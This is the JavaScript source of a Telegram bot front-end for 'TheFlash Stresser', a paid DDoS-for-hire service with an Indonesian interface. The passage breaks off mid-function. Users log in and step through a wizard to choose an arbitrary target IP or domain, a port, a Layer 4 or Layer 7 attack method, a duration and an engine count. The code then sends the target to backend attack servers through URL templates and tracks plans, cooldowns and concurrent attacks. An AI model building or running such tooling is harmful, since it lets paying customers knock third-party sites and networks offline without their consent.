/**
 * ⚡ TheFlash Stresser — Telegram Bot
 * Run: node bot.js
 */

'use strict';

require('dotenv').config();

const https = require('https');
const http  = require('http');
const bcrypt = require('bcrypt');

const { get, all, run, initDb }          = require('./src/db');
const { sanitize, stripControlChars, hasUnsafeText } = require('./src/lib/sanitize');
const { generateToken }                  = require('./src/lib/crypto');
const {
  FALLBACK_USER_MAX_SECONDS,
  TARGET_REGEX, DURATION_REGEX,
  RUN_TARGET_MAX, RUN_DURATION_MAX,
} = require('./src/config');

// ───────────────────────────────────────────────────────────────────────────────
//  CONFIG
// ───────────────────────────────────────────────────────────────────────────────
const BOT_TOKEN        = process.env.TELEGRAM_BOT_TOKEN;
const REQUIRED_CHAT_ID = process.env.TELEGRAM_REQUIRED_CHAT_ID
  ? Number(process.env.TELEGRAM_REQUIRED_CHAT_ID)
  : null;

if (!BOT_TOKEN) {
  console.error('[TheFlash Bot] ❌  TELEGRAM_BOT_TOKEN tidak di-set di .env');
  process.exit(1);
}

// ───────────────────────────────────────────────────────────────────────────────
//  STATE
// ───────────────────────────────────────────────────────────────────────────────
/** @type {Map<number,{ userId:number, username:string }>} */
const sessions     = new Map();
/** @type {Map<number,{ step:string, data:object }>} */
const pendingInput = new Map();

// ───────────────────────────────────────────────────────────────────────────────
//  HELPERS
// ───────────────────────────────────────────────────────────────────────────────
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const parseDur = (v) => {
  const t = String(v || '').toLowerCase().trim();
  if (!t) return 0;
  const m = t.match(/(\d+(?:\.\d+)?)/);
  if (!m) return 0;
  const n = Number(m[1]);
  if (!Number.isFinite(n) || n < 0) return 0;
  if (/hour|hr|\d+h\b/.test(t)) return Math.round(n * 3600);
  if (/min|\d+m\b/.test(t))     return Math.round(n * 60);
  return Math.round(n);
};

const fmtTime = (s) => {
  const n = Number(s);
  if (!n || n <= 0) return '—';
  if (n >= 3600 && n % 3600 === 0) return `${n / 3600}h`;
  if (n >= 60   && n % 60   === 0) return `${n / 60}m`;
  return `${n}s`;
};

const fmtNum = (v, fb = 0, min = 0) => {
  const p = Number(v);
  if (!Number.isFinite(p)) return fb;
  const r = Math.trunc(p);
  return r < min ? fb : r;
};

const fmtCurrency = (v) => `$${Number(v || 0).toFixed(2)}`;

const progressBar = (used, max, len = 10) => {
  if (!max) return '▱'.repeat(len);
  const filled = Math.round((used / max) * len);
  return '▰'.repeat(Math.min(filled, len)) + '▱'.repeat(Math.max(0, len - filled));
};

const cleanTarget = (v) => {
  const r = stripControlChars(String(v || '')).trim().slice(0, RUN_TARGET_MAX);
  if (!r || hasUnsafeText(r) || !TARGET_REGEX.test(r)) return '';
  return r;
};

const cleanDuration = (v) => {
  const r = stripControlChars(String(v || '')).trim().slice(0, RUN_DURATION_MAX);
  if (!r || hasUnsafeText(r) || !DURATION_REGEX.test(r)) return '';
  return r;
};

const shortId = (id = '') => id.slice(0, 8) + '…';

// ───────────────────────────────────────────────────────────────────────────────
//  TELEGRAM API
// ───────────────────────────────────────────────────────────────────────────────
const tg = (method, payload = {}) =>
  new Promise((resolve, reject) => {
    const body = JSON.stringify(payload);
    const req  = https.request(
      {
        hostname : 'api.telegram.org',
        path     : `/bot${BOT_TOKEN}/${method}`,
        method   : 'POST',
        headers  : { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
      },
      (res) => {
        let data = '';
        res.on('data', (c) => { data += c; });
        res.on('end', () => { try { resolve(JSON.parse(data)); } catch (e) { reject(e); } });
      }
    );
    req.on('error', reject);
    req.setTimeout(20000, () => req.destroy(new Error('timeout')));
    req.write(body);
    req.end();
  });

const sendMsg = (chatId, text, extra = {}) =>
  tg('sendMessage', { chat_id: chatId, text, parse_mode: 'HTML', ...extra }).catch(() => {});

const editMsg = (chatId, msgId, text, extra = {}) =>
  tg('editMessageText', { chat_id: chatId, message_id: msgId, text, parse_mode: 'HTML', ...extra }).catch(() => {});

const answerCb = (id, text = '', alert = false) =>
  tg('answerCallbackQuery', { callback_query_id: id, text, show_alert: alert }).catch(() => {});

const deleteMsg = (chatId, msgId) =>
  tg('deleteMessage', { chat_id: chatId, message_id: msgId }).catch(() => {});

// ───────────────────────────────────────────────────────────────────────────────
//  KEYBOARDS
// ───────────────────────────────────────────────────────────────────────────────
const KB = {
  main: () => ({
    inline_keyboard: [
      [{ text: '⚔️  Attack', callback_data: 'cmd_attack' }, { text: '📊  Ongoing', callback_data: 'cmd_ongoing' }],
      [{ text: '📋  Methods', callback_data: 'cmd_methods' }, { text: '💳  Plan', callback_data: 'cmd_plan' }],
      [{ text: '💰  Balance', callback_data: 'cmd_balance' }, { text: '👤  Profile', callback_data: 'cmd_whoami' }],
      [{ text: '🚪  Logout', callback_data: 'cmd_logout' }],
    ],
  }),
  back: (cb = 'cmd_menu') => ({
    inline_keyboard: [[{ text: '‹ Back', callback_data: cb }]],
  }),
  yesNo: (yesCb, noCb = 'cmd_menu') => ({
    inline_keyboard: [[{ text: '✅ Ya', callback_data: yesCb }, { text: '❌ Tidak', callback_data: noCb }]],
  }),
  stopAttack: (jobId) => ({
    inline_keyboard: [
      [{ text: '🛑 Stop Attack', callback_data: `stop_${jobId}` }],
      [{ text: '‹ Menu', callback_data: 'cmd_menu' }],
    ],
  }),
  methodPage: (methods, page = 0, perPage = 6) => {
    const total = Math.ceil(methods.length / perPage);
    const slice = methods.slice(page * perPage, (page + 1) * perPage);
    const rows  = [];
    for (let i = 0; i < slice.length; i += 2) {
      const row = [{ text: `⚔️ ${slice[i].name}`, callback_data: `sel_method_${slice[i].name}` }];
      if (slice[i + 1]) row.push({ text: `⚔️ ${slice[i + 1].name}`, callback_data: `sel_method_${slice[i + 1].name}` });
      rows.push(row);
    }
    const nav = [];
    if (page > 0)         nav.push({ text: '« Prev', callback_data: `method_page_${page - 1}` });
    if (page < total - 1) nav.push({ text: 'Next »', callback_data: `method_page_${page + 1}` });
    if (nav.length) rows.push(nav);
    rows.push([{ text: '‹ Menu', callback_data: 'cmd_menu' }]);
    return { inline_keyboard: rows };
  },
};

// ───────────────────────────────────────────────────────────────────────────────
//  DB HELPERS
// ───────────────────────────────────────────────────────────────────────────────
const mapMethod = (r) => r ? ({
  id: r.id, hash: r.hash, name: r.name,
  display: r.display_name || r.name,
  maxDur: fmtNum(r.max_duration_seconds),
  access: r.access_level || 'Basic',
  apiAccess: Number(r.api_access) === 1,
  layer: r.layer || 'Layer 7',
  enabled: Number(r.enabled) === 1,
}) : null;

const mapServer = (r) => {
  if (!r) return null;
  let methods = [];
  try { methods = JSON.parse(r.methods || '[]'); } catch (_) {}
  return { id: r.id, name: r.name, apiUrl: r.api_url, durMax: fmtNum(r.duration_max), engine: fmtNum(r.engine, 1, 1), methods, status: r.status };
};

const srvSupports = (srv, hash) => {
  const norm = hash.toLowerCase();
  return (srv.methods || []).some((e) => {
    const u = String(e).toUpperCase();
    return u === 'ALL' || u === '*' || String(e).toLowerCase() === norm;
  });
};

const srvAllowsDur = (srv, sec) => { const m = fmtNum(srv.durMax); return m <= 0 || sec <= m; };

const buildUrl = (tpl, { target, port, sec, label }) =>
  String(tpl)
    .replace(/\[(host|url|target)\]/gi, target)
    .replace(/\[(port)\]/gi, String(port || 0))
    .replace(/\[(time|duration)\]/gi, String(sec))
    .replace(/\[(method)\]/gi, label);

const httpGet = (url, ms = 10000) => new Promise((resolve, reject) => {
  let parsed; try { parsed = new URL(url); } catch (e) { reject(e); return; }
  const lib = parsed.protocol === 'https:' ? https : http;
  const r = lib.request(parsed, { method: 'GET' }, (res) => { res.resume(); res.on('end', () => resolve(res.statusCode)); });
  r.on('error', reject);
  r.setTimeout(ms, () => r.destroy(new Error('timeout')));
  r.end();
});

const getOccupancy = async () => {
  const map = {};
  try {
    const rows = await all('SELECT duration_seconds, created_at, engine, servers FROM ongoing_runs');
    const now = Date.now();
    rows.forEach((row) => {
      const dur = Number(row.duration_seconds) || 0;
      if (!dur) return;
      const ca = Date.parse(row.created_at);
      if ((isFinite(ca) ? ca : now) + dur * 1000 <= now) return;
      let ids = []; try { ids = JSON.parse(row.servers || '[]'); } catch (_) {}
      ids.forEach((id) => { map[id] = (map[id] || 0) + (Number(row.engine) || 0); });
    });
  } catch (_) {}
  return map;
};

const allocate = (servers, eng, occ) => {
  const assignments = [];
  for (const srv of servers) {
    const free = Math.max(0, fmtNum(srv.engine, 1, 1) - (occ[srv.id] || 0));
    const cnt  = Math.min(eng, free);
    if (cnt > 0) assignments.push({ srv, cnt });
  }
  return { assignments, ok: assignments.length > 0 };
};

const getActiveConc = async (userId) => {
  const rows = await all(`SELECT job_id, duration_seconds, created_at, engine FROM ongoing_runs WHERE user_id = ?`, [userId]);
  const now = Date.now(); const expired = [];
  let active = 0;
  for (const r of rows) {
    const dur = Number(r.duration_seconds) || 0;
    if (!dur) { expired.push(r.job_id); continue; }
    const ca = Date.parse(r.created_at);
    const rem = Math.max(0, dur - Math.floor((now - (isFinite(ca) ? ca : now)) / 1000));
    if (rem <= 0) { expired.push(r.job_id); continue; }
    active += Math.max(0, Math.trunc(Number(r.engine) || 0));
  }
  if (expired.length) {
    const ph = expired.map(() => '?').join(',');
    await run(`DELETE FROM ongoing_runs WHERE job_id IN (${ph})`, expired).catch(() => {});
  }
  return active;
};

const checkCooldown = async (userId, cd) => {
  if (!cd || cd <= 0) return { ok: true };
  try {
    const r = await get('SELECT created_at FROM logs_run WHERE user_id = ? ORDER BY datetime(created_at) DESC LIMIT 1', [userId]);
    if (!r) return { ok: true };
    const elapsed = Math.trunc((Date.now() - new Date(r.created_at).getTime()) / 1000);
    if (elapsed < cd) return { ok: false, rem: cd - elapsed };
  } catch (_) {}
  return { ok: true };
};

const logAttack = async (uid, jobId, method, target, port, durInput, durSec, eng, status, createdAt) => {
  try {
    await run(
      `INSERT INTO logs_run (user_id,job_id,method,target,port,duration,duration_seconds,engine,status,created_at) VALUES (?,?,?,?,?,?,?,?,?,?)`,
      [uid, jobId, method, target, port, durInput, durSec, eng, status, createdAt]
    );
    await run(
      `INSERT INTO settings (key,value,updated_at) VALUES ('total_attacks_count','1',?) ON CONFLICT(key) DO UPDATE SET value=CAST(CAST(value AS INTEGER)+1 AS TEXT),updated_at=?`,
      [createdAt, createdAt]
    );
  } catch (e) { console.error('[Bot] logAttack:', e.message); }
};

const resolvePlan = async (userId) => {
  const u = await get('SELECT * FROM users WHERE id = ?', [userId]);
  if (!u) return { planId: null, maxTime: FALLBACK_USER_MAX_SECONDS, maxConc: 1, plan: null, user: null };
  const planId = Number(u.plan) || null;
  if (!planId) return { planId: null, maxTime: FALLBACK_USER_MAX_SECONDS, maxConc: 1, plan: null, user: u };
  const p = await get('SELECT * FROM plans WHERE id = ?', [planId]);
  if (!p) return { planId: null, maxTime: FALLBACK_USER_MAX_SECONDS, maxConc: 1, plan: null, user: u };
  const plan = {
    id: p.id, name: p.display_name || p.name,
    time: fmtNum(p.time_seconds, FALLBACK_USER_MAX_SECONDS),
    conc: fmtNum(p.conc, 1, 1),
    cooldown: fmtNum(p.cooldown_seconds),
    access: p.access_level || 'Basic',
    apiAccess: Number(p.api_access) === 1,
    expired: fmtNum(p.expired_days),
  };
  return { planId: plan.id, maxTime: plan.time || FALLBACK_USER_MAX_SECONDS, maxConc: plan.conc, plan, user: u };
};

const isMember = async (tgId) => {
  if (!REQUIRED_CHAT_ID) return true;
  try {
    const r = await tg('getChatMember', { chat_id: REQUIRED_CHAT_ID, user_id: tgId });
    return ['member', 'administrator', 'creator'].includes(r?.result?.status);
  } catch (_) { return false; }
};

// ───────────────────────────────────────────────────────────────────────────────
//  CORE ATTACK LOGIC
// ───────────────────────────────────────────────────────────────────────────────
const doAttack = async ({ userId, target, port, durInput, methodInput, eng: engReq }) => {
  const limits = await resolvePlan(userId);
  if (!limits.planId)
    return { ok: false, err: '❌ Kamu belum punya plan aktif.\n\nBeli plan di website terlebih dahulu.' };

  const cd = await checkCooldown(userId, limits.plan.cooldown);
  if (!cd.ok)
    return { ok: false, err: `⏳ Cooldown aktif, tunggu <b>${fmtTime(cd.rem)}</b> lagi.` };

  const mRow = await get('SELECT * FROM methods WHERE (hash=? OR name=?) AND enabled=1', [methodInput, methodInput]);
  if (!mRow)
    return { ok: false, err: `❌ Method <code>${methodInput}</code> tidak ditemukan atau tidak aktif.` };
  const method = mapMethod(mRow);

  if (limits.plan.access !== 'Premium' && method.access !== 'Basic')
    return { ok: false, err: '❌ Method ini membutuhkan plan <b>Premium</b>.' };

  const durSec = parseDur(durInput);
  if (!durSec) return { ok: false, err: '❌ Durasi tidak valid.' };

  const rawMax = Number(method.maxDur) || 0;
  const maxSec = rawMax > 0 ? Math.min(limits.maxTime, rawMax) : limits.maxTime;
  if (durSec > maxSec)
    return { ok: false, err: `❌ Durasi melebihi batas.\n\nMaksimal: <b>${fmtTime(maxSec)}</b>` };

  if (method.layer === 'Layer 4' && (port <= 0 || port > 65535))
    return { ok: false, err: '❌ Port tidak valid untuk Layer 4. Gunakan port 1–65535.' };

  const activeConc = await getActiveConc(userId);
  const freeConc   = Math.max(0, limits.maxConc - activeConc);
  if (freeConc <= 0)
    return { ok: false, err: `❌ Concurrent limit tercapai (<b>${limits.maxConc}</b>).\n\nHentikan attack yang berjalan terlebih dahulu.` };

  const usedEng = Math.min(engReq, freeConc);

  const srvRows = await all(`SELECT id,name,api_url,duration_max,engine,methods,status FROM servers WHERE status='Online' ORDER BY id`);
  const srvs    = srvRows.map(mapServer).filter((s) => s && s.apiUrl);
  const supp    = srvs.filter((s) => srvSupports(s, method.hash));
  if (!supp.length) return { ok: false, err: '❌ Tidak ada server yang mendukung method ini.' };

  const durOk = supp.filter((s) => srvAllowsDur(s, durSec));
  if (!durOk.length) return { ok: false, err: '❌ Tidak ada server yang mengizinkan durasi ini.' };

  const occ = await getOccupancy();
  const { assignments, ok: assigned } = allocate(durOk, usedEng, occ);
  if (!assigned) return { ok: false, err: '❌ Semua server sedang penuh. Coba lagi sesaat.' };

  const label = method.name || method.display || method.hash;
  try {
    for (const { srv, cnt } of assignments) {
      for (let i = 0; i < cnt; i++) {
        const url = buildUrl(srv.apiUrl, { target, port, sec: durSec, label });
        if (!url) throw new Error(`bad_url:${srv.id}`);
        const code = await httpGet(url);
        if (code < 200 || code >= 300) throw new Error(`srv_${code}`);
      }
    }
  } catch (e) {
    console.error('[Bot] dispatch error:', e.message);
    return { ok: false, err: '❌ Gagal mengirim ke server. Coba lagi.' };
  }

  const createdAt = new Date().toISOString();
  const jobId     = generateToken();
  const srvIds    = [...new Set(assignments.map((a) => a.srv.id))];
  await run(
    `INSERT INTO ongoing_runs (user_id,job_id,method,target,port,duration,duration_seconds,engine,servers,status,created_at) VALUES (?,?,?,?,?,?,?,?,?,?,?)`,
    [userId, jobId, method.hash, target, port, durInput, durSec, usedEng, JSON.stringify(srvIds), 'ongoing', createdAt]
  );
  await logAttack(userId, jobId, method.hash, target, port, durInput, durSec, usedEng, 'success', createdAt);

  return { ok: true, jobId, target, port, durSec, method: method.hash, display: method.display || method.name, eng: usedEng };
};

// ───────────────────────────────────────────────────────────────────────────────
//  STOP ATTACK
// ───────────────────────────────────────────────────────────────────────────────
const stopJob = async (userId, jobIdPrefix) => {
  const row = await get(
    `SELECT job_id,method,target,port,duration_seconds,servers FROM ongoing_runs WHERE job_id LIKE ? AND user_id=? LIMIT 1`,
    [`${jobIdPrefix}%`, userId]
  );
  if (!row) return { ok: false, err: '❌ Job tidak ditemukan atau bukan milikmu.' };

  const srvRows = await all(`SELECT id, api_url FROM servers WHERE status='Online'`);
  let srvIds = []; try { srvIds = JSON.parse(row.servers || '[]'); } catch (_) {}
  const stopSrvs = srvRows.filter((s) => srvIds.includes(s.id) && s.api_url);

  for (const srv of stopSrvs) {
    const url = buildUrl(srv.api_url, { target: row.target, port: row.port, sec: Number(row.duration_seconds) || 0, label: 'STOP' });
    if (url) httpGet(url).catch(() => {});
  }

  await run('DELETE FROM ongoing_runs WHERE job_id=? AND user_id=?', [row.job_id, userId]);
  return { ok: true, row };
};

// ───────────────────────────────────────────────────────────────────────────────
//  UI RENDER FUNCTIONS
// ───────────────────────────────────────────────────────────────────────────────

const renderMenu = async (tgId) => {
  const s = sessions.get(tgId);
  if (!s) return { text: '❌ Sesi tidak ditemukan.', kb: null };
  const limits = await resolvePlan(s.userId);
  const active = await getActiveConc(s.userId);
  const planName = limits.plan?.name || '—';
  const bar = progressBar(active, limits.maxConc);

  const text =
`╔══════════════════════════════╗
   ⚡  <b>THEFLASH STRESSER</b>  ⚡
╚══════════════════════════════╝

👤  <b>${s.username}</b>  ·  💳 ${planName}

⚡ <b>Concurrent</b>
<code>${bar}</code>  ${active}/${limits.maxConc}

📡 Pilih menu di bawah:`;

  return { text, kb: KB.main() };
};

const renderProfile = async (tgId) => {
  const s = sessions.get(tgId);
  const limits = await resolvePlan(s.userId);
  const u = limits.user;
  const p = limits.plan;
  const active = await getActiveConc(s.userId);
  const bal = fmtCurrency(u?.balance || 0);
  const bar = progressBar(active, limits.maxConc);

  return `╔══════════════════════════════╗
    👤  <b>PROFIL AKUN</b>
╚══════════════════════════════╝

🔖  Username   :  <code>${u?.username || '—'}</code>
💳  Plan       :  <b>${p?.name || 'Tidak ada'}</b>
🛡  Akses      :  ${p?.access || '—'}
💰  Balance    :  <b>${bal}</b>
👑  Admin      :  ${Number(u?.is_admin) === 1 ? '✅ Ya' : '❌ Tidak'}

⚔️  <b>Plan Stats</b>
┣ Durasi Max  :  <b>${fmtTime(p?.time)}</b>
┣ Concurrent  :  <b>${p?.conc ?? '—'}</b>
┣ Cooldown    :  <b>${p?.cooldown ? fmtTime(p.cooldown) : 'Tidak ada'}</b>
┗ API Access  :  ${p?.apiAccess ? '✅ Ya' : '❌ Tidak'}

⚡ <b>Concurrent Usage</b>
<code>${bar}</code>  ${active}/${limits.maxConc}`;
};

const renderMethods = async (tgId, page = 0) => {
  const s = sessions.get(tgId);
  const limits = await resolvePlan(s.userId);
  const planAccess = limits.plan?.access || 'Basic';
  const rows = await all('SELECT * FROM methods WHERE enabled=1 ORDER BY layer ASC, name ASC');

  const text =
`╔══════════════════════════════╗
   ⚔️  <b>DAFTAR METHOD</b>
╚══════════════════════════════╝

💳 Planmu: <b>${planAccess}</b>
📊 Total:  <b>${rows.length}</b> method aktif

`;

  const perPage = 6;
  const slice = rows.slice(page * perPage, (page + 1) * perPage);
  const lines = slice.map((r) => {
    const m = mapMethod(r);
    const lock = (planAccess !== 'Premium' && m.access !== 'Basic') ? ' 🔒' : '';
    const dur  = m.maxDur > 0 ? ` <i>(max ${fmtTime(m.maxDur)})</i>` : '';
    const layer = m.layer === 'Layer 4' ? '🔵' : '🟣';
    return `${layer} <code>${m.name}</code>${dur}${lock}`;
  }).join('\n');

  return { text: text + lines, kb: KB.methodPage(rows, page) };
};

const renderOngoing = async (tgId) => {
  const s = sessions.get(tgId);
  const rows = await all(
    `SELECT job_id,method,target,port,duration_seconds,engine,created_at FROM ongoing_runs WHERE user_id=? ORDER BY created_at DESC`,
    [s.userId]
  );
  const now = Date.now();
  const active = rows.filter((r) => {
    const dur = Number(r.duration_seconds) || 0;
    if (!dur) return false;
    const ca = Date.parse(r.created_at);
    return (isFinite(ca) ? ca : now) + dur * 1000 > now;
  });

  if (!active.length)
    return {
      text: `╔══════════════════════════════╗
   📊  <b>ONGOING ATTACKS</b>
╚══════════════════════════════╝

📭 Tidak ada attack yang sedang berjalan.`,
      kb: KB.back(),
    };

  const lines = active.map((r, i) => {
    const ca  = Date.parse(r.created_at);
    const elapsed = Math.floor((now - ca) / 1000);
    const rem = Math.max(0, Number(r.duration_seconds) - elapsed);
    const bar = progressBar(elapsed, Number(r.duration_seconds), 8);
    return `<b>${i + 1}.</b> 🎯 <code>${r.target}:${r.port || 0}</code>
   ⚔️ <code>${r.method}</code>  ⚡ ${r.engine} engine
   ⏱ Sisa: <b>${fmtTime(rem)}</b>
   <code>${bar}</code>
   🆔 <code>${r.job_id}</code>`;
  }).join('\n\n');

  const stopBtns = active.map((r) => [{ text: `🛑 Stop ${r.target}:${r.port || 0}`, callback_data: `stop_${r.job_id}` }]);
  stopBtns.push([{ text: '🛑 Stop Semua', callback_data: 'cmd_stopall' }]);
  stopBtns.push([{ text: '‹ Menu', callback_data: 'cmd_menu' }]);

  return {
    text: `╔══════════════════════════════╗
   📊  <b>ONGOING ATTACKS</b>  (${active.length})
╚══════════════════════════════╝

${lines}`,
    kb: { inline_keyboard: stopBtns },
  };
};

// ───────────────────────────────────────────────────────────────────────────────
//  COMMAND HANDLERS
// ───────────────────────────────────────────────────────────────────────────────

const cmdStart = async (chatId, tgId, firstName) => {
  if (sessions.has(tgId)) {
    const { text, kb } = await renderMenu(tgId);
    return sendMsg(chatId, text, { reply_markup: kb });
  }
  return sendMsg(chatId,
`╔══════════════════════════════╗
   ⚡  <b>THEFLASH STRESSER</b>  ⚡
╚══════════════════════════════╝

Halo, <b>${firstName}</b>! 👋

Bot ini memungkinkan kamu melakukan
<b>stress testing</b> langsung dari Telegram.

🚀 Untuk memulai, silakan login:`,
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔐  Login ke Akun', callback_data: 'cmd_login' }],
        ],
      },
    }
  );
};

const cmdMenu = async (chatId, tgId) => {
  if (!sessions.has(tgId))
    return sendMsg(chatId, '❌ Kamu belum login.\n\nGunakan /start untuk memulai.');
  const { text, kb } = await renderMenu(tgId);
  return sendMsg(chatId, text, { reply_markup: kb });
};

const startLoginWizard = async (chatId, tgId) => {
  if (sessions.has(tgId)) {
    const s = sessions.get(tgId);
    return sendMsg(chatId, `✅ Sudah login sebagai <b>${s.username}</b>.\n\nGunakan /menu untuk kembali ke menu.`);
  }
  pendingInput.set(tgId, { step: 'login_user', data: {} });
  return sendMsg(chatId,
`╔══════════════════════════════╗
   🔐  <b>LOGIN</b>
╚══════════════════════════════╝

Masukkan <b>username</b> akun TheFlash kamu:`,
    { reply_markup: { force_reply: true, selective: true } }
  );
};

const startAttackWizard = async (chatId, tgId) => {
  if (!sessions.has(tgId)) return sendMsg(chatId, '❌ Login dulu. /start');
  if (!(await isMember(tgId))) {
    return sendMsg(chatId,
`╔══════════════════════════════╗
   🚫  <b>AKSES DITOLAK</b>
╚══════════════════════════════╝

Kamu harus join grup/channel resmi untuk menggunakan fitur attack.

Setelah join, coba lagi.`
    );
  }
  pendingInput.set(tgId, { step: 'atk_target', data: {} });
  return sendMsg(chatId,
`╔══════════════════════════════╗
   ⚔️  <b>LAUNCH ATTACK</b>
╚══════════════════════════════╝

<b>[ Step 1/5 ]</b>  🎯 <b>Target</b>

Masukkan IP atau domain target:
<i>Contoh: 192.168.1.1 atau example.com</i>`,
    { reply_markup: { force_reply: true, selective: true } }
  );
};

// ───────────────────────────────────────────────────────────────────────────────
//  PENDING INPUT WIZARD
// ───────────────────────────────────────────────────────────────────────────────

const handleWizard = async (chatId, tgId, text) => {
  const p = pendingInput.get(tgId);
  if (!p) return false;
  const { step, data } = p;

  /* ─── LOGIN ─── */
  if (step === 'login_user') {
    const username = sanitize(text).trim();
    if (!username || username.length < 3 || username.length > 32) {
      await sendMsg(chatId, '❌ Username tidak valid (3–32 karakter).\n\nMasukkan ulang:');
      return true;
    }
    data.username = username;
    pendingInput.set(tgId, { step: 'login_pass', data });
    await sendMsg(chatId,
`✅ Username: <code>${username}</code>

<b>[ Step 2/2 ]</b>  🔑 <b>Password</b>

Masukkan password kamu:`,
      { reply_markup: { force_reply: true, selective: true } }
    );
    return true;
  }

  if (step === 'login_pass') {
    pendingInput.delete(tgId);
    const password = text.trim();
    const userRow  = await get('SELECT * FROM users WHERE username=?', [data.username]);
    let   valid    = false;
    if (userRow) { try { valid = await bcrypt.compare(password, userRow.password); } catch (_) {} }
    if (!userRow || !valid) {
      return sendMsg(chatId,
`╔══════════════════════════════╗
   ❌  <b>LOGIN GAGAL</b>
╚══════════════════════════════╝

Username atau password salah.`,
        { reply_markup: { inline_keyboard: [[{ text: '🔄 Coba Lagi', callback_data: 'cmd_login' }]] } }
      );
    }
    if (Number(userRow.is_banned) === 1) {
      return sendMsg(chatId, '🚫 Akun kamu telah dibanned.');
    }
    sessions.set(tgId, { userId: userRow.id, username: userRow.username });
    const { text: menuText, kb } = await renderMenu(tgId);
    return sendMsg(chatId,
`╔══════════════════════════════╗
   ✅  <b>LOGIN BERHASIL</b>
╚══════════════════════════════╝

Selamat datang, <b>${userRow.username}</b>! 🎉

${menuText}`,
      { reply_markup: kb }
    );
  }

  /* ─── ATTACK WIZARD ─── */
  if (step === 'atk_target') {
    const target = cleanTarget(text.trim());
    if (!target) {
      await sendMsg(chatId, '❌ Target tidak valid.\n\nMasukkan IP atau domain yang benar:');
      return true;
    }
    data.target = target;
    pendingInput.set(tgId, { step: 'atk_port', data });
    await sendMsg(chatId,
`✅ Target: <code>${target}</code>

<b>[ Step 2/5 ]</b>  🔌 <b>Port</b>

Masukkan port (0 untuk Layer 7):
<i>Contoh: 80, 443, 0</i>`,
      { reply_markup: { force_reply: true, selective: true } }
    );
    return true;
  }

  if (step === 'atk_port') {
    const port = parseInt(text.trim(), 10);
    if (isNaN(port) || port < 0 || port > 65535) {
      await sendMsg(chatId, '❌ Port tidak valid (0–65535).\n\nCoba lagi:');
      return true;
    }
    data.port = port;
    pendingInput.set(tgId, { step: 'atk_method', data });

    const rows = await all('SELECT name, layer FROM methods WHERE enabled=1 ORDER BY layer, name');
    const l4   = rows.filter((r) => r.layer === 'Layer 4').map((r) => `🔵 <code>${r.name}</code>`).join('  ');
    const l7   = rows.filter((r) => r.layer !== 'Layer 4').map((r) => `🟣 <code>${r.name}</code>`).join('  ');

    await sendMsg(chatId,
`✅ Port: <b>${port}</b>

<b>[ Step 3/5 ]</b>  ⚔️ <b>Method</b>

${l4 ? `<b>Layer 4:</b>\n${l4}\n\n` : ''}<b>Layer 7:</b>\n${l7 || '—'}

Ketik nama method:`,
      { reply_markup: { force_reply: true, selective: true } }
    );
    return true;
  }

  if (step === 'atk_method') {
    const methodInput = sanitize(text.trim()).toLowerCase();
    const mRow = await get('SELECT * FROM methods WHERE (hash=? OR name=?) AND enabled=1', [methodInput, methodInput]);
    if (!mRow) {
      await sendMsg(chatId, `❌ Method <code>${methodInput}</code> tidak ditemukan.\n\nKetik /methods untuk lihat daftar:`);
      return true;
    }
    const method = mapMethod(mRow);
    data.method  = methodInput;
    data.maxDur  = method.maxDur;
    pendingInput.set(tgId, { step: 'atk_duration', data });
    const maxTxt = method.maxDur > 0 ? ` (max <b>${fmtTime(method.maxDur)}</b>)` : '';
    await sendMsg(chatId,
`✅ Method: <code>${method.name}</code>  ${method.layer}

<b>[ Step 4/5 ]</b>  ⏱ <b>Durasi</b>${maxTxt}

Masukkan durasi:
<i>Contoh: 60s, 5m, 1h</i>`,
      { reply_markup: { force_reply: true, selective: true } }
    );
    return true;
  }

  if (step === 'atk_duration') {
    const durInput = cleanDuration(text.trim());
    if (!durInput) {
      await sendMsg(chatId, '❌ Format durasi tidak valid.\n\nContoh: <code>60s</code>, <code>5m</code>, <code>1h</code>\n\nCoba lagi:');
      return true;
    }
    data.duration = durInput;
    pendingInput.set(tgId, { step: 'atk_engine', data });

    const s = sessions.get(tgId);
    const limits = await resolvePlan(s.userId);
    const active = await getActiveConc(s.userId);
    const free   = Math.max(0, limits.maxConc - active);
    const bar    = progressBar(active, limits.maxConc);

    await sendMsg(chatId,
`✅ Durasi: <b>${durInput}</b>

<b>[ Step 5/5 ]</b>  ⚡ <b>Engine/Concurrent</b>

<code>${bar}</code>  ${active}/${limits.maxConc}
Tersedia: <b>${free}</b>

Masukkan jumlah engine:`,
      { reply_markup: { force_reply: true, selective: true } }
    );
    return true;
  }

  if (step === 'atk_engine') {
    const eng = Math.max(1, parseInt(text.trim(), 10) || 1);
    data.engine = eng;
    pendingInput.delete(tgId);

    const s = sessions.get(tgId);
    const sent = await tg('sendMessage', {
      chat_id: chatId, parse_mode: 'HTML',
      text:
`╔══════════════════════════════╗
   ⏳  <b>LAUNCHING ATTACK...</b>
╚══════════════════════════════╝

🎯 <code>${data.target}:${data.port}</code>
⚔️ <code>${data.method}</code>
⏱ ${data.duration}  ⚡ ${eng} engine

<i>Menghubungi server...</i>`,
    });

    const result = await doAttack({
      userId: s.userId,
      target: data.target,
      port: data.port,
      durInput: data.duration,
      methodInput: data.method,
      eng,
    });

    if (!result.ok) {
      return editMsg(chatId, sent?.result?.message_id,
`╔══════════════════════════════╗
   ❌  <b>ATTACK GAGAL</b>
╚══════════════════════════════╝

${result.err}`,
        { reply_markup: KB.back() }
      );
    }

    return editMsg(chatId, sent?.result?.message_id,
`╔══════════════════════════════╗
   ✅  <b>ATTACK LAUNCHED!</b>  ✅
╚══════════════════════════════╝

🎯 <b>Target</b>   :  <code>${result.target}:${result.port || 0}</code>
⚔️ <b>Method</b>   :  <code>${result.display || result.method}</code>
⏱ <b>Durasi</b>   :  <b>${fmtTime(result.durSec)}</b>
⚡ <b>Engine</b>   :  <b>${result.eng}</b>

🆔 <b>Job ID</b>:
<code>${result.jobId}</code>`,
      { reply_markup: KB.stopAttack(result.jobId) }
    );
  }

  return false;
};

// ───────────────────────────────────────────────────────────────────────────────
//  CALLBACK QUERY HANDLER
// ───────────────────────────────────────────────────────────────────────────────

const handleCallback = async (query) => {
  const chatId = query.message?.chat?.id;
  const msgId  = query.message?.message_id;
  const tgId   = query.from?.id;
  const data   = query.data || '';
  await answerCb(query.id);

  if (!sessions.has(tgId) && !['cmd_login', 'cmd_start'].includes(data)) {
    return tg('answerCallbackQuery', { callback_query_id: query.id, text: '⚠️ Sesi berakhir. Ketik /start', show_alert: true });
  }

  // ── Menu ──
  if (data === 'cmd_menu') {
